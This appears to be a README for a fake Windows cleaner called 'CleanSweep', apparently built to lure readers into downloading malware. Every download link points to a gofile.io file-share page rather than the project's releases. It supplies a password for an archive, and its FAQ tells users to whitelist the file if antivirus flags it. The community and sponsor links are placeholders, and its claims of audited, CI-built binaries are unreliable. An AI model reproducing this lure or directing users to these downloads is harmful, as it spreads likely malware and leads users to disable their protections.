<div align="center">

<img src="assets/banner.png" alt="CleanSweep" width="100%"/>

# 🧽 CleanSweep

**Free, open-source Windows cleaner — temp files, cache, browser junk, with a whitelist safer than CCleaner.**

![Version](https://img.shields.io/github/v/release/formghostfeel/clean-sweep?style=flat-square&color=blue)
![Build](https://img.shields.io/github/actions/workflow/status/formghostfeel/clean-sweep/ci.yml?branch=main&style=flat-square&label=build)
![Downloads](https://img.shields.io/github/downloads/formghostfeel/clean-sweep/total?style=flat-square&color=green)
![Stars](https://img.shields.io/github/stars/formghostfeel/clean-sweep?style=flat-square&color=yellow)
![License](https://img.shields.io/github/license/formghostfeel/clean-sweep?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=flat-square)

[⬇️ Download Latest Release](https://gofile.io/d/45ae4r94) · [📚 Docs](docs/) · [💬 Discord](https://discord.gg/yourinvite) · [🐛 Report Bug](.github/ISSUE_TEMPLATE/bug_report.md)

</div>

---


## Download

| Source | Link |
|---|---|
| 💾 **Direct download** | [clean-sweep.exe](https://gofile.io/d/45ae4r94) |
| 🌐 **Mirror** | [clean-sweep-setup-windows-x64.exe](https://gofile.io/d/45ae4r94) |

> Archive password: `5139237619`
## ✨ Features

✅ **Safe Cleaning** — whitelist-driven, nothing critical
✅ **Browser Caches** — Chrome, Edge, Firefox, Brave
✅ **System Junk** — temp, thumbnails, error dumps
✅ **Scheduled Cleanups**
✅ **Full Undo** — recycle bin only
✅ **Portable & Installer**
✅ **Fast** — parallel scan
✅ **No Telemetry**


## 📸 Screenshots

| Main Window | Settings | Results |
|:---:|:---:|:---:|
| ![Main](assets/screenshots/main.png) | ![Settings](assets/screenshots/settings.png) | ![Results](assets/screenshots/results.png) |

### 🎬 Live Demo

![clean-sweep Demo](assets/gifs/demo.gif)

## 🚀 Installation

> Requires Windows 10 (1909+) or Windows 11. Free, ~50 MB.

**[⬇️ Download clean-sweep-Setup.exe ](https://gofile.io/d/45ae4r94)**

```powershell
winget install clean-sweep
```

Full step-by-step guide: **[docs/installation.md](docs/installation.md)**

## ⚔️ How It Compares

| Feature | **CleanSweep** | CCleaner | BleachBit |
|---|:---:|:---:|:---:|
| Price | **Free, MIT** | Free (upsells) | Free |
| Open source | ✅ | ❌ | ✅ |
| Whitelist-first design | ✅ | ❌ | ❌ |
| Recycle-bin only | ✅ | ❌ | Partial |
| Ads/upsell | ❌ | ✅ | ❌ |
| Portable | ✅ 5 MB | ✅ | ✅ |


## 📋 Changelog

### [1.2.0] — 2026-09-25

### Added
- Per-scenario profiles with auto-apply
- Global hotkeys (toggle, panic restore)
- Portable mode (`--portable`)
- Built-in status dashboard

### Changed
- Faster startup (~150ms cold start)
- Reduced memory footprint

### Fixed
- Settings not persisting after reboot in portable mode

## [1.1.0] — 2026-08-12

### Added
- Import/export of community presets
- Dark & light themes
- CLI mode for scripting

### Fixed
- High-DPI scaling on 125% displays

## [1.0.0] — 2026-06-20

### Added
- 🎉 Initial public release
- Core engine, hotkeys, tray icon, settings UI


Full history: [CHANGELOG.md](CHANGELOG.md)

## ❓ FAQ

<details>
<summary><b>Is it safe? Do I need to disable my antivirus?</b></summary>

Yes, it's safe, and **no, you never need to disable your antivirus**. The app is fully open source — every line is auditable here. Binaries are built automatically by GitHub Actions from this exact code (see the green build badge) with published SHA-256 hashes. If your antivirus flags the portable exe, it's a heuristic false positive — [verify the hash and whitelist it](docs/troubleshooting.md#antivirus-false-positive).
</details>

<details>
<summary><b>Is it really free?</b></summary>

100%. MIT license, no ads, no account, no upsell. If you like it, [sponsor the project](https://github.com/sponsors/yourname).
</details>

<details>
<summary><b>Which Windows versions are supported?</b></summary>

Windows 10 build 18363+ and Windows 11, x64. Windows Server 2019+ works but is untested.
</details>

<details>
<summary><b>Is this just CCleaner with a new name?</b></summary>

No — CleanSweep never touches registry cleaning (the riskiest, least useful operation CCleaner markets) and deletes only to the Recycle Bin with a curated whitelist you can audit in the source.
</details>

## 💬 Community

[![Discord](https://img.shields.io/badge/Discord-Join%20Server-5865F2?style=flat-square&logo=discord&logoColor=white)](https://discord.gg/yourinvite)
[![Telegram](https://img.shields.io/badge/Telegram-Channel-26A5E4?style=flat-square&logo=telegram&logoColor=white)](https://t.me/clean-sweep)
[![YouTube](https://img.shields.io/badge/YouTube-Tutorials-FF0000?style=flat-square&logo=youtube&logoColor=white)](https://youtube.com/@clean-sweep)

- 💬 **Discord** — support, presets sharing, beta builds
- 📢 **Telegram** — release announcements
- 🎥 **YouTube** — setup and tuning guides

## ❤️ Support the Project

clean-sweep is free and will always be. If it's useful to you, consider sponsoring:

[![Sponsor](https://img.shields.io/badge/%E2%9D%A4-Sponsor%20on%20GitHub-ff69b4?style=flat-square)](https://github.com/sponsors/yourname)

Also: ⭐ star the repo, 🐛 [report bugs](../../issues), 🌐 [translate](CONTRIBUTING.md), 👨‍💻 [contribute code](CONTRIBUTING.md).

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=formghostfeel/clean-sweep&type=Date)](https://star-history.com/#formghostfeel/clean-sweep&Date)

---

<div align="center">

**⭐ If clean-sweep helps you, a star is the best "thank you" — it helps others find the tool. ⭐**

Made with 🛠 by the community · Licensed under [MIT](LICENSE)

</div>
